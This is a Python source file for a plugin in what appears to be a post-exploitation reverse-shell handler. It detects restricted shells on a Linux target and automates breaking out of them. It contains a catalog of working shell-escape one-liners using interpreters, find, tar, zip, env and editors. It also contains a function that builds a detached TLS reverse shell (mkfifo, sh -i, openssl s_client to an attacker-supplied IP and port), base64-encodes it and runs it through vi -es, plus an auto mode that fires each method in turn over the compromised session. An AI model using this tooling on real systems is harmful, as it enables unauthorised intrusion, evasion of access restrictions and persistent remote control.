"""Restricted shell detection and escape automation."""

import base64
from collections import defaultdict

from ..api import plugin, SessionContext
from ._helpers import build_linux_collector_command
from ..shared.common import format_generic_report
from ..shared.runner import run_collector_plugin


_USAGE = """rshell — Restricted shell detection and escape automation.

Usage:
  run rshell [options]                   Show this help.
  run rshell -chk                        Detect shell state, restriction
                                         indicators, and available binaries.
  run rshell -list                       Show the method catalog with
                                         per-target availability.
  run rshell -run <method_id> [options]  Attempt one specific method.
  run rshell -auto [options]             Try every runnable method; report
                                         what succeeded, what was skipped,
                                         and what remains manual.

Options (required only for methods that spawn a new session):
  -rh <ip>       Reverse shell host IP that the target should connect back to.
  -rp <port>     TLS listener port on the handler (typically the -tp port).

Method kinds:
  exec      Replaces the current process.
  child     Spawns a child shell in the current session.
  callback  Spawns a NEW TLS session back to the handler. Requires -rh
            and -rp. Watch `status` for the new client.
  manual    Requires interactive input. Instructions are printed.
"""


# ---------------------------------------------------------------------------
# Method catalog
# ---------------------------------------------------------------------------
# (binary, method_id, command_or_None, kind, note)
#
# kind='callback' means the command will be replaced by a TLS reverse
# shell payload at run time, using the -rh / -rp values supplied on the
# command line.

_METHODS = [
    # --- Editors: callback mode (vi -es, spawns new TLS session) ---
    ('vi',      'vi_esc',       'editor', 'callback', 'runs vi -es, spawns new TLS session'),
    ('vim',     'vim_esc',      'editor', 'callback', 'runs vim -es, spawns new TLS session'),

    # --- Editors: manual only ---
    ('ed',      'ed_bang',      None, 'manual', 'open ed, then type !/bin/bash'),
    ('nano',    'nano_exec',    None, 'manual', 'Ctrl-R Ctrl-X to run a command'),
    ('emacs',   'emacs_esc',    None, 'manual', 'M-x shell or M-! to run a command'),
    ('joe',     'joe_esc',      None, 'manual', 'Ctrl-K / to run a command'),

    # --- Pagers: manual ---
    ('less',    'less_bang',    None, 'manual', 'less <file>, then !/bin/bash'),
    ('more',    'more_bang',    None, 'manual', 'more <file>, then !/bin/bash'),
    ('man',     'man_bang',     None, 'manual', 'man <page>, then !/bin/bash'),
    ('git',     'git_pager',    None, 'manual', 'git -p help, then !/bin/bash'),

    # --- Interpreters: child / exec (no callback) ---
    ('python',  'python_system',  "python -c 'import os; os.system(\"/bin/bash\")'",  'child', None),
    ('python',  'python_pty',     "python -c 'import pty; pty.spawn(\"/bin/bash\")'", 'child', 'proper PTY allocation'),
    ('python3', 'python3_system', "python3 -c 'import os; os.system(\"/bin/bash\")'",  'child', None),
    ('python3', 'python3_pty',    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 'child', 'proper PTY allocation'),
    ('perl',    'perl_exec',      "perl -e 'exec \"/bin/bash\";'",          'exec', None),
    ('ruby',    'ruby_exec',      "ruby -e 'exec \"/bin/bash\"'",           'exec', None),
    ('php',     'php_system',     "php -r 'system(\"/bin/bash\");'",        'child', None),
    ('lua',     'lua_exec',       "lua -e 'os.execute(\"/bin/sh\")'",       'child', None),
    ('node',    'node_spawn',     "node -e 'require(\"child_process\").spawn(\"/bin/bash\",[],{stdio:\"inherit\"})'", 'child', None),

    # --- Utilities ---
    ('awk',     'awk_system',     "awk 'BEGIN {system(\"/bin/sh\")}'",      'child', None),
    ('find',    'find_exec',      "find / -maxdepth 0 -exec /bin/bash -p \\; 2>/dev/null", 'child', None),
    ('gdb',     'gdb_exec',       "gdb -q -batch -ex '!exec /bin/bash' 2>/dev/null", 'exec', 'requires ptrace permission'),
    ('socat',   'socat_exec',     "socat exec:/bin/bash,pty,stderr,setsid,sigint,sane", 'exec', 'clean PTY, no parent'),
    ('tar',     'tar_checkpoint', "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash 2>/dev/null", 'child', None),
    ('busybox', 'busybox_sh',     "busybox sh -p 2>/dev/null || busybox sh", 'child', 'busybox may not enforce rbash'),

    # --- File operations ---
    ('cp',      'cp_bash',        "cp /bin/bash /tmp/.tn_esc && chmod +x /tmp/.tn_esc && /tmp/.tn_esc -p; rm -f /tmp/.tn_esc", 'exec', 'cleans up after exec'),
    ('zip',     'zip_unzip',      "cd /tmp && zip .tn_z.zip /etc/hostname -T --unzip-command='sh -c /bin/bash' 2>/dev/null; rm -f /tmp/.tn_z.zip", 'child', None),

    # --- Env / shell builtin ---
    ('env',     'env_shell',      "SHELL=/bin/bash env /bin/bash -p",       'exec', 'bypasses shell restriction on env'),
    ('sh',      'sh_dollar0',     "$0 -p 2>/dev/null || exec /bin/bash -p", 'exec', 'tries to re-exec without restriction'),

    # --- SQL clients ---
    ('mysql',   'mysql_bang',     None, 'manual', 'mysql -u root, then \\! /bin/bash'),
    ('psql',    'psql_bang',      None, 'manual', 'psql, then \\! /bin/bash'),
    ('sqlite3', 'sqlite_bang',    None, 'manual', 'sqlite3, then .shell /bin/bash'),

    # --- Network clients ---
    ('ftp',     'ftp_bang',       None, 'manual', 'ftp, then !/bin/bash'),
]


_ALL_BINARIES = sorted({entry[0] for entry in _METHODS})


# ---------------------------------------------------------------------------
# Detection collector
# ---------------------------------------------------------------------------

def _detect_source():
    return r'''
import os
import shutil
import subprocess

result = {
    'summary': {},
    'shell': {},
    'env': {},
    'available_binaries': {},
    'missing_binaries': [],
    'restriction_indicators': [],
    'restriction_probes': {},
}

BINARIES = ''' + repr(_ALL_BINARIES) + r'''


def sh(cmd, timeout=5):
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout,
        )
        return out.decode('utf-8', 'ignore') if isinstance(out, bytes) else out
    except Exception:
        return ''


result['shell']['shell_var'] = os.environ.get('SHELL', '')
result['shell']['pid'] = os.getpid()
result['shell']['ppid'] = os.getppid()

for proc_path in (f'/proc/{os.getppid()}/comm', f'/proc/{os.getppid()}/cmdline'):
    try:
        with open(proc_path, 'rb') as fh:
            data = fh.read()
        if proc_path.endswith('cmdline'):
            data = data.split(b'\x00')[0]
        result['shell']['parent_name'] = data.decode('utf-8', 'ignore').strip()
    except Exception:
        pass

probes = {}

try:
    old = os.getcwd()
    os.chdir('/')
    os.chdir(old)
    probes['cd_absolute'] = 'allowed'
except Exception as e:
    probes['cd_absolute'] = f'blocked: {e}'

try:
    with open('/tmp/.tn_probe', 'w') as fh:
        fh.write('x')
    os.remove('/tmp/.tn_probe')
    probes['output_redirect'] = 'allowed'
except Exception as e:
    probes['output_redirect'] = f'blocked: {e}'

try:
    r = subprocess.run(['/bin/echo', 'ok'], capture_output=True, timeout=3)
    probes['exec_absolute'] = 'allowed' if r.returncode == 0 else 'blocked'
except Exception as e:
    probes['exec_absolute'] = f'blocked: {e}'

out = sh('/bin/echo ok')
probes['command_with_slash'] = 'allowed' if 'ok' in out else 'blocked'

result['restriction_probes'] = probes

parent_name = result['shell'].get('parent_name', '').lower()
restricted_kind = ''
for kind in ('rbash', 'rksh', 'rzsh', 'rssh'):
    if kind in parent_name or kind in result['shell']['shell_var'].lower():
        restricted_kind = kind
        break

if not restricted_kind:
    for kind in ('bash', 'ksh', 'zsh', 'sh', 'dash'):
        if parent_name.startswith('r' + kind) or result['shell']['shell_var'].endswith('/r' + kind):
            restricted_kind = 'r' + kind
            break

result['shell']['restricted_kind'] = restricted_kind or '(not detected)'
result['shell']['is_restricted'] = bool(restricted_kind) or probes.get('command_with_slash') == 'blocked'


result['env'] = {
    'PATH': os.environ.get('PATH', ''),
    'HOME': os.environ.get('HOME', ''),
    'USER': os.environ.get('USER', ''),
    'UID': str(os.getuid()) if hasattr(os, 'getuid') else '?',
    'BASH_ENV': os.environ.get('BASH_ENV', ''),
    'ENV': os.environ.get('ENV', ''),
    'TMOUT': os.environ.get('TMOUT', ''),
}

if not result['env']['PATH']:
    result['restriction_indicators'].append('PATH is empty')
if result['env']['BASH_ENV']:
    result['restriction_indicators'].append('BASH_ENV is set (may execute code on shell startup)')
if result['env']['TMOUT'] and result['env']['TMOUT'].isdigit():
    result['restriction_indicators'].append('TMOUT is set (idle timeout)')
if probes.get('command_with_slash') == 'blocked':
    result['restriction_indicators'].append('Commands containing / are blocked (rbash behaviour)')
if 'blocked' in str(probes.get('cd_absolute', '')):
    result['restriction_indicators'].append('cd to absolute path is blocked')
if 'blocked' in str(probes.get('output_redirect', '')):
    result['restriction_indicators'].append('Output redirection to /tmp is blocked')

for b in BINARIES:
    path = shutil.which(b)
    if path:
        result['available_binaries'][b] = path
    else:
        result['missing_binaries'].append(b)


result['summary'] = {
    'is_restricted': result['shell']['is_restricted'],
    'restricted_kind': result['shell']['restricted_kind'],
    'parent_process': result['shell'].get('parent_name', '(unknown)'),
    'uid': result['env']['UID'],
    'available_count': len(result['available_binaries']),
    'missing_count': len(result['missing_binaries']),
    'indicators': len(result['restriction_indicators']),
}

_emit(result)
'''


def _build_detect_command():
    return build_linux_collector_command(_detect_source())


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def _parse_args(args):
    """Split args into positional tokens and -rh / -rp values."""
    rh = None
    rp = None
    positional = []
    i = 0
    while i < len(args):
        a = args[i]
        if a in ('-rh', '--rh'):
            if i + 1 < len(args):
                rh = args[i + 1]
                i += 2
                continue
        elif a in ('-rp', '--rp'):
            if i + 1 < len(args):
                try:
                    rp = int(args[i + 1])
                except ValueError:
                    rp = None
                i += 2
                continue
        positional.append(a)
        i += 1
    return positional, rh, rp


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _batch_binary_check(session: SessionContext, binaries):
    """Return the set of binaries present on the target.

    Single round-trip: the target iterates over the whole list and
    prints TN_BIN:<name> for each one it finds.
    """
    if not binaries:
        return set()

    handler = session._handler
    sock = session._client_sock
    names = ' '.join(binaries)
    marker_s = '__TN_BATCH_S__'
    marker_e = '__TN_BATCH_E__'

    cmd = (
        f"printf '%s\\n' '{marker_s}'; "
        f"for b in {names}; do "
        f"  command -v \"$b\" >/dev/null 2>&1 && printf 'TN_BIN:%s\\n' \"$b\"; "
        f"done; "
        f"printf '%s\\n' '{marker_e}'"
    )

    try:
        handler._flush_shell(sock, timeout=0.3)
        if not handler.send_to_revshell(sock, cmd):
            return set()
        out = handler.recv_output(sock, timeout=10.0, until_marker=marker_e) or ''
    except Exception:
        return set()

    # The shell echoes the command before running it, so the marker
    # strings appear at least twice in the raw output: once inside the
    # echo, once in the real result. rfind picks the real one. Using
    # `find` here was the bug — it landed on the echoed command and
    # parsed the middle of that string as if it were the result.
    start = out.rfind(marker_s)
    if start < 0:
        return set()
    start += len(marker_s)
    end = out.find(marker_e, start)
    if end < 0:
        return set()

    body = out[start:end]
    found = set()
    for line in body.splitlines():
        line = line.strip()
        if line.startswith('TN_BIN:'):
            found.add(line[len('TN_BIN:'):].strip())
    return found


def _binary_exists(session: SessionContext, binary: str) -> bool:
    return binary in _batch_binary_check(session, [binary])


def _find_method(method_id: str):
    for entry in _METHODS:
        if entry[1] == method_id:
            return entry
    return None


# ---------------------------------------------------------------------------
# TLS reverse shell payload
# ---------------------------------------------------------------------------

def _build_tls_reverse_shell_payload(ip: str, port: int) -> str:
    """TLS reverse shell via openssl s_client over a fifo.

    Shape (matches a known-working payload):
      mkfifo /tmp/F; sh -i < /tmp/F 2>&1 |
        openssl s_client -quiet -connect IP:PORT -ign_eof > /tmp/F; rm /tmp/F

    The pipeline forms a loop: sh's stdout feeds openssl's stdin, openssl's
    stdout feeds the fifo, and sh's stdin reads from the fifo. -ign_eof
    keeps openssl alive when the parent closes its stdin (otherwise the
    tunnel drops immediately after launch).

    Wrapped with setsid/nohup so vi -es (or the restricted shell) returns
    instead of waiting for the pipeline. A random fifo suffix avoids
    collisions if multiple callbacks are fired.
    """
    import secrets
    tag = secrets.token_hex(4)
    fifo = f"/tmp/.tn_{tag}"

    inner = (
        f"mkfifo {fifo}; "
        f"sh -i < {fifo} 2>&1 | "
        f"openssl s_client -quiet -connect {ip}:{port} -ign_eof "
        f"> {fifo}; "
        f"rm -f {fifo}"
    )

    return (
        f"if command -v setsid >/dev/null 2>&1; then "
        f"  setsid sh -c '{inner}' </dev/null >/dev/null 2>&1 & "
        f"else "
        f"  nohup sh -c '{inner}' </dev/null >/dev/null 2>&1 & "
        f"fi"
    )


def _build_editor_callback_command(editor: str, tls_payload: str) -> str:
    """Wrap the TLS payload so vi -es runs it without hijacking the PTY.

    The payload is base64-encoded and stored in a shell variable, then
    decoded and passed to vi via Ex mode's `:!` command. This avoids all
    quoting conflicts with the payload's own quotes and pipes.
    """
    b64 = base64.b64encode(tls_payload.encode('utf-8')).decode('ascii')
    invocation = 'vim -u NONE -es' if editor == 'vim' else f'{editor} -es'
    return (
        f"TN_B64='{b64}'; "
        f"TN_CMD=$(printf '%s' \"$TN_B64\" | base64 -d); "
        f"printf '!%s\\nq\\n' \"$TN_CMD\" | "
        f"TERM=dumb {invocation} /dev/null >/dev/null 2>&1; "
        f"unset TN_B64 TN_CMD"
    )


def _require_rh_rp(session: SessionContext, method_id: str, rh, rp) -> bool:
    """Validate that -rh and -rp are set. Returns True if OK."""
    if rh and rp:
        return True
    c = session.colors
    session.print(
        f"{c['red']}Method {method_id} spawns a new session and requires "
        f"-rh and -rp.{c['end']}"
    )
    session.print(
        f"{c['yellow']}Usage: run rshell -run {method_id} -rh <ip> -rp <port>{c['end']}"
    )
    session.print(
        f"{c['yellow']}-rh should be the IP the target can reach the handler on "
        f"(the interface the current reverse shell came in on).{c['end']}"
    )
    session.print(
        f"{c['yellow']}-rp should be the handler's TLS listener port "
        f"(the -tp argument).{c['end']}"
    )
    return False


# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------

def _run_check(session: SessionContext) -> int:
    return run_collector_plugin(
        session,
        'rshell',
        _build_detect_command,
        None,
        format_generic_report,
        timeout=45.0,
    )


def _run_list(session: SessionContext) -> int:
    c = session.colors

    session.print("")
    session.print(f"{c['cyan']}RSHELL — Escape method catalog{c['end']}")
    session.print("=" * 78)
    session.print(f"{c['yellow']}Probing binaries on target (single round-trip)...{c['end']}")

    present = _batch_binary_check(session, _ALL_BINARIES)

    by_bin = defaultdict(list)
    for entry in _METHODS:
        by_bin[entry[0]].append(entry)

    auto_count = 0
    callback_count = 0
    manual_count = 0
    skipped_count = 0

    for binary in sorted(by_bin.keys()):
        exists = binary in present
        if exists:
            status = f"{c['green']}present{c['end']}"
        else:
            status = f"{c['red']}missing{c['end']}"

        session.print(f"\n  {c['bold']}{binary}{c['end']}  [{status}]")

        for entry in by_bin[binary]:
            _, mid, cmd, kind, note = entry
            if cmd is None:
                manual_count += 1
                label = f"{c['yellow']}[manual]{c['end']}"
                session.print(f"      {mid:<18} {label:<10} {note or ''}")
            elif not exists:
                skipped_count += 1
                label = f"{c['red']}[skip]{c['end']}"
                session.print(
                    f"      {mid:<18} {label:<10} "
                    f"{c['red']}binary not present{c['end']}"
                )
            elif kind == 'callback':
                callback_count += 1
                label = f"{c['blue']}[callback]{c['end']}"
                session.print(
                    f"      {mid:<18} {label:<10} "
                    f"{c['blue']}spawns new TLS session — needs -rh / -rp"
                    f"{c['end']}"
                )
                if note:
                    session.print(
                        f"      {'':<29} {c['blue']}note: {note}{c['end']}"
                    )
            else:
                auto_count += 1
                color = {
                    'exec': c['cyan'],
                    'child': c['cyan'],
                }.get(kind, c['cyan'])
                label = f"{color}[{kind}]{c['end']}"
                session.print(f"      {mid:<18} {label:<10} {cmd}")
                if note:
                    session.print(
                        f"      {'':<29} {c['blue']}note: {note}{c['end']}"
                    )

    session.print("")
    session.print("-" * 78)
    session.print(
        f"  {c['green']}{auto_count}{c['end']} runnable  |  "
        f"{c['blue']}{callback_count}{c['end']} callback  |  "
        f"{c['yellow']}{manual_count}{c['end']} manual  |  "
        f"{c['red']}{skipped_count}{c['end']} skipped"
    )
    session.print(
        f"  Run one:  {c['yellow']}run rshell -run <method_id> [-rh ip -rp port]{c['end']}"
    )
    session.print(
        f"  Run all:  {c['yellow']}run rshell -auto [-rh ip -rp port]{c['end']}"
    )
    session.print("")
    return 0


def _execute_method(session: SessionContext, entry, rh, rp):
    """Send a method's command, print the result. Returns True if sent."""
    c = session.colors
    binary, mid, cmd, kind, note = entry

    if cmd is None:
        return False

    display_cmd = cmd

    if kind == 'callback':
        if not _require_rh_rp(session, mid, rh, rp):
            return False
        tls_payload = _build_tls_reverse_shell_payload(rh, rp)
        cmd = _build_editor_callback_command(binary, tls_payload)
        display_cmd = f"(TLS reverse shell to {rh}:{rp})"

    session.print(f"{c['yellow']}Method: {mid}  [{kind}]{c['end']}")
    session.print(f"{c['cyan']}Command: {display_cmd}{c['end']}")
    if note:
        session.print(f"{c['blue']}Note: {note}{c['end']}")

    if kind == 'exec':
        session.print(
            f"{c['yellow']}Replaces the current shell. Exiting ends the session.{c['end']}"
        )
    elif kind == 'child':
        session.print(
            f"{c['yellow']}Spawns a child shell. Exiting returns to the restricted shell.{c['end']}"
        )
    elif kind == 'callback':
        session.print(
            f"{c['blue']}Spawns a new TLS session to {rh}:{rp}. "
            f"Watch `status` for a new client.{c['end']}"
        )

    session.print("")

    handler = session._handler
    sock = session._client_sock

    try:
        handler._flush_shell(sock, timeout=0.5)
        if not handler.send_to_revshell(sock, cmd):
            session.print(f"{c['red']}Send failed — connection lost.{c['end']}")
            return False
        out = handler.recv_output(sock, timeout=6.0) or ''
    except Exception as exc:
        session.print(f"{c['red']}Send failed: {exc}{c['end']}")
        return False

    if out.strip():
        session.print(out)

    session.log_plugin_result(
        'rshell', f'Method {mid} sent ({binary}, {kind})', cmd
    )
    return True


def _run_one(session: SessionContext, method_id: str, rh, rp) -> int:
    c = session.colors

    entry = _find_method(method_id)
    if entry is None:
        session.print(f"{c['red']}Unknown method: {method_id}{c['end']}")
        session.print(
            f"{c['yellow']}Run 'run rshell -list' to see available methods.{c['end']}"
        )
        return 1

    binary, mid, cmd, kind, note = entry

    if cmd is None:
        session.print(
            f"{c['yellow']}Method {mid} requires interactive input and "
            f"cannot be automated.{c['end']}"
        )
        if note:
            session.print(f"{c['cyan']}Manual instructions: {note}{c['end']}")
        session.print(
            f"{c['yellow']}Run the binary via `switch` and use its "
            f"shell-escape feature.{c['end']}"
        )
        return 1

    if kind == 'callback' and not _require_rh_rp(session, mid, rh, rp):
        return 1

    session.print(f"{c['cyan']}Checking for {binary}...{c['end']}")
    if not _binary_exists(session, binary):
        session.print(
            f"{c['red']}{binary} is not present — method {mid} skipped.{c['end']}"
        )
        session.log_plugin_result(
            'rshell', '', f'{mid}: binary {binary} not present'
        )
        return 1

    session.print(f"{c['green']}{binary} present.{c['end']}")
    session.print("")

    return 0 if _execute_method(session, entry, rh, rp) else 1


_AUTO_ORDER = [
    'python3_pty', 'python3_system',
    'python_pty', 'python_system',
    'perl_exec', 'ruby_exec',
    'socat_exec',
    'awk_system',
    'find_exec',
    'busybox_sh',
    'node_spawn',
    'lua_exec', 'php_system',
    'tar_checkpoint',
    'env_shell',
    'sh_dollar0',
    'vi_esc', 'vim_esc',
]


def _run_auto(session: SessionContext, rh, rp) -> int:
    c = session.colors

    has_callback_creds = rh is not None and rp is not None

    session.print(
        f"{c['cyan']}Auto mode: trying every runnable method in order "
        f"of reliability.{c['end']}"
    )
    session.print(
        f"{c['yellow']}Missing binaries are skipped. Manual-only methods "
        f"are reported at the end.{c['end']}"
    )
    if not has_callback_creds:
        session.print(
            f"{c['yellow']}No -rh / -rp given — callback methods (vi/vim) "
            f"will be skipped. Add '-rh <ip> -rp <port>' to enable them."
            f"{c['end']}"
        )
    session.print(
        f"{c['yellow']}After a successful send, wait 3-5 s and run "
        f"`status` to check for a new session.{c['end']}"
    )
    session.print("")

    auto_binaries = sorted(
        {_find_method(m)[0] for m in _AUTO_ORDER if _find_method(m)}
    )
    session.print(f"{c['yellow']}Probing binaries...{c['end']}")
    present = _batch_binary_check(session, auto_binaries)

    succeeded = []
    skipped_missing = []
    skipped_creds = []

    for mid in _AUTO_ORDER:
        entry = _find_method(mid)
        if entry is None:
            continue
        binary, _, cmd, kind, note = entry

        if kind == 'callback' and not has_callback_creds:
            session.print(
                f"{c['yellow']}[skip] {mid} — needs -rh / -rp{c['end']}"
            )
            skipped_creds.append((mid, binary))
            continue

        if binary not in present:
            session.print(
                f"{c['red']}[skip] {mid} ({binary} not present){c['end']}"
            )
            skipped_missing.append((mid, binary))
            continue

        session.print(f"{c['cyan']}[*] {mid} ({binary}){c['end']}")
        ok = _execute_method(session, entry, rh, rp)
        if ok:
            succeeded.append((mid, binary, kind))
            break
        session.print(f"    {c['yellow']}send failed — trying next{c['end']}")

    manual_methods = [entry for entry in _METHODS if entry[2] is None]

    session.print("")
    session.print(f"{c['cyan']}─── Auto mode summary ───{c['end']}")

    if succeeded:
        mid, binary, kind = succeeded[0]
        session.print(
            f"  {c['green']}Sent:{c['end']} {mid} ({binary}, {kind})"
        )
        if kind == 'callback':
            session.print(
                f"  {c['blue']}A new TLS session should appear in `status` "
                f"shortly (connected to {rh}:{rp}).{c['end']}"
            )
        elif kind == 'child':
            session.print(
                f"  {c['blue']}You should now be in a child shell. "
                f"Type a command to confirm.{c['end']}"
            )
        else:
            session.print(
                f"  {c['blue']}The current shell may have been replaced. "
                f"Type a command to confirm.{c['end']}"
            )
    else:
        session.print(
            f"  {c['red']}No runnable method was sent successfully.{c['end']}"
        )

    if skipped_missing:
        session.print("")
        session.print(f"  {c['yellow']}Skipped (binary not present):{c['end']}")
        for mid, binary in skipped_missing:
            session.print(f"    {mid} ({binary})")

    if skipped_creds:
        session.print("")
        session.print(
            f"  {c['yellow']}Skipped (missing -rh / -rp):{c['end']}"
        )
        for mid, binary in skipped_creds:
            session.print(f"    {mid} ({binary})")

    if manual_methods:
        session.print("")
        session.print(
            f"  {c['yellow']}Manual methods still available "
            f"(run via `switch`):{c['end']}"
        )
        for binary, mid, _, kind, note in manual_methods:
            session.print(f"    {mid:<18} {binary:<10} {note or ''}")

    session.print("")
    return 0 if succeeded else 1


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

@plugin.command(
    name='rshell',
    platforms=['linux', 'unix'],
    description='Restricted shell detection and escape (-chk / -list / -run / -auto with TLS callbacks)',
)
def run(session: SessionContext, args):
    if not args:
        session.print(_USAGE)
        return 0

    positional, rh, rp = _parse_args(args)

    if not positional:
        session.print(_USAGE)
        return 0

    sub = positional[0].lower()

    if sub in ('-h', '--help', 'help'):
        session.print(_USAGE)
        return 0

    if sub in ('-chk', '--check', 'check'):
        return _run_check(session)

    if sub in ('-list', '--list', 'list'):
        return _run_list(session)

    if sub in ('-run', '--run', 'run'):
        if len(positional) < 2:
            session.print("Usage: run rshell -run <method_id> [-rh ip -rp port]", 'red')
            return 1
        return _run_one(session, positional[1].lower(), rh, rp)

    if sub in ('-auto', '--auto', 'auto'):
        return _run_auto(session, rh, rp)

    session.print(f"Unknown argument: {sub}", 'red')
    session.print(_USAGE)
    return 1